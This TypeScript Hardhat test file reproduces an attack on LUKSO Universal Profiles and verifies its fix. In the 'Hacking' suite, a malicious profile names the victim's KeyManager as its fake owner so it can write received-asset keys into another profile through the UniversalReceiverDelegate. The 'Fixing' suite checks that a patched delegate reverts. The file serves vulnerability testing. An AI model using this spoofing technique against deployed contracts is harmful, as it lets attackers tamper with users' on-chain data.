import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { ethers } from "hardhat";

import {
  UniversalProfile,
  UniversalProfile__factory,
  MUniversalProfile,
  MUniversalProfile__factory,
  LSP6KeyManager,
  LSP6KeyManager__factory,
  LSP1UniversalReceiverDelegateUP,
    LSP1UniversalReceiverDelegateUP__factory,
    MLSP1UniversalReceiverDelegateUP,
  MLSP1UniversalReceiverDelegateUP__factory,
  LSP7Mintable,
  LSP7Mintable__factory,
} from "../../types";

import { LSP5_ARRAY_KEY, ARRAY_LENGTH } from "../utils/helpers";

// constants
import {
  ERC725YKeys,
  ALL_PERMISSIONS_SET,
  OPERATIONS,
  PERMISSIONS,
} from "../../constants";
describe("Hacking", () => {
  let accounts: SignerWithAddress[];

  let URD: LSP1UniversalReceiverDelegateUP;

  let KM1: LSP6KeyManager;

  let Profile1: UniversalProfile;
  let MaliciousProfile: MUniversalProfile;

  let EOA1: SignerWithAddress;
  let MaliciousEOA: SignerWithAddress;

  let lsp7token: LSP7Mintable;

  beforeAll(async () => {
    accounts = await ethers.getSigners();
    EOA1 = accounts[1];
    MaliciousEOA = accounts[2];

    Profile1 = await new UniversalProfile__factory(EOA1).deploy(EOA1.address);
    MaliciousProfile = await new MUniversalProfile__factory(
      MaliciousEOA
    ).deploy(MaliciousEOA.address);

    KM1 = await new LSP6KeyManager__factory(EOA1).deploy(Profile1.address);

    URD = await new LSP1UniversalReceiverDelegateUP__factory(
      accounts[0]
    ).deploy();

    await Profile1.connect(EOA1).setData(
      [ERC725YKeys.LSP0.LSP1UniversalReceiverDelegate],
      [URD.address]
    );
      
        lsp7token = await new LSP7Mintable__factory(accounts[5]).deploy(
      "MyToken",
      "MTKT",
      accounts[5].address,
      false
    );

    await setupPermissions(Profile1, EOA1, URD, KM1);
  });

  describe("Using current version of URD", () => {
    it("Sett KM1 as fake owner of Malicious UniversalProfile", async () => {
      await MaliciousProfile.connect(MaliciousEOA).setOwner(KM1.address);
      const fakeOwner = await MaliciousProfile.owner();
      expect(fakeOwner).toEqual(KM1.address);
    });

    it("No keys regsitred yet in Profile1", async () => {
      const [arraylength] = await Profile1.connect(EOA1).getData([
        ERC725YKeys.LSP5["LSP5ReceivedAssets[]"],
      ]);
      expect(arraylength).toEqual("0x");
    });

    it("Setting Keys on Profile1 through URD", async () => {
      const abi = URD.interface.encodeFunctionData(
        "universalReceiverDelegate",
        [
          lsp7token.address,
          "0xdbe2c314e1aee2970c72666f2ebe8933a8575263ea71e5ff6a9178e95d47a26f",
          "0x",
        ]
      );
        
        await MaliciousProfile.connect(MaliciousEOA).execute(0, URD.address, 0, abi);
    });
      
        it("keys regsitred yet in Profile1", async () => {
      const [arraylength] = await Profile1.connect(EOA1).getData([
        ERC725YKeys.LSP5["LSP5ReceivedAssets[]"],
      ]);
      expect(arraylength).toEqual(ARRAY_LENGTH.ONE);
    });
  });
});

describe("Fixing", () => {
  let accounts: SignerWithAddress[];

  let URD: MLSP1UniversalReceiverDelegateUP;

  let KM1: LSP6KeyManager;

  let Profile1: UniversalProfile;
  let MaliciousProfile: MUniversalProfile;

  let EOA1: SignerWithAddress;
  let MaliciousEOA: SignerWithAddress;

  let lsp7token: LSP7Mintable;

  beforeAll(async () => {
    accounts = await ethers.getSigners();
    EOA1 = accounts[1];
    MaliciousEOA = accounts[2];

    Profile1 = await new UniversalProfile__factory(EOA1).deploy(EOA1.address);
    MaliciousProfile = await new MUniversalProfile__factory(
      MaliciousEOA
    ).deploy(MaliciousEOA.address);

    KM1 = await new LSP6KeyManager__factory(EOA1).deploy(Profile1.address);

    URD = await new MLSP1UniversalReceiverDelegateUP__factory(
      accounts[0]
    ).deploy();

    await Profile1.connect(EOA1).setData(
      [ERC725YKeys.LSP0.LSP1UniversalReceiverDelegate],
      [URD.address]
    );
      
        lsp7token = await new LSP7Mintable__factory(accounts[5]).deploy(
      "MyToken",
      "MTKT",
      accounts[5].address,
      false
    );

    await setupPermissions(Profile1, EOA1, URD, KM1);
  });

  describe("Using New Version of URD", () => {
    it("Sett KM1 as fake owner of Malicious UniversalProfile", async () => {
      await MaliciousProfile.connect(MaliciousEOA).setOwner(KM1.address);
      const fakeOwner = await MaliciousProfile.owner();
      expect(fakeOwner).toEqual(KM1.address);
    });

    it("No keys regsitred yet in Profile1", async () => {
      const [arraylength] = await Profile1.connect(EOA1).getData([
        ERC725YKeys.LSP5["LSP5ReceivedAssets[]"],
      ]);
      expect(arraylength).toEqual("0x");
    });

    it("Revert setting Keys on Profile1 through URD", async () => {
      const abi = URD.interface.encodeFunctionData(
        "universalReceiverDelegate",
        [
          lsp7token.address,
          "0xdbe2c314e1aee2970c72666f2ebe8933a8575263ea71e5ff6a9178e95d47a26f",
          "0x",
        ]
      );
        
       await expect(
        MaliciousProfile.connect(MaliciousEOA).execute(0, URD.address, 0, abi)
      ).toBeRevertedWith(
        "Not the same Profile"
       );
    });
      
        it("keys will not be regsitred yet Profile1", async () => {
      const [arraylength] = await Profile1.connect(EOA1).getData([
        ERC725YKeys.LSP5["LSP5ReceivedAssets[]"],
      ]);
      expect(arraylength).toEqual("0x");
    });
  });
});

export async function setupPermissions(profile, EOA, URD, KM) {
  await profile
    .connect(EOA)
    .setData(
      [
        ERC725YKeys.LSP6["AddressPermissions:Permissions"] +
          EOA.address.substr(2),
      ],
      [ALL_PERMISSIONS_SET]
    );

  let URDPermissions = ethers.utils.hexZeroPad(PERMISSIONS.SETDATA, 32);

  await profile
    .connect(EOA)
    .setData(
      [
        ERC725YKeys.LSP6["AddressPermissions:Permissions"] +
          URD.address.substr(2),
      ],
      [URDPermissions]
    );

  await profile.connect(EOA).transferOwnership(KM.address);
}

export async function getMapAndArrayKeyValues(
  account,
  arrayKey: string,
  elementInArray: string
) {
  let [mapValue, arrayLength, elementAddress] = await account.getData([
    arrayKey,
    elementInArray,
  ]);

  return [mapValue, arrayLength, elementAddress];
}
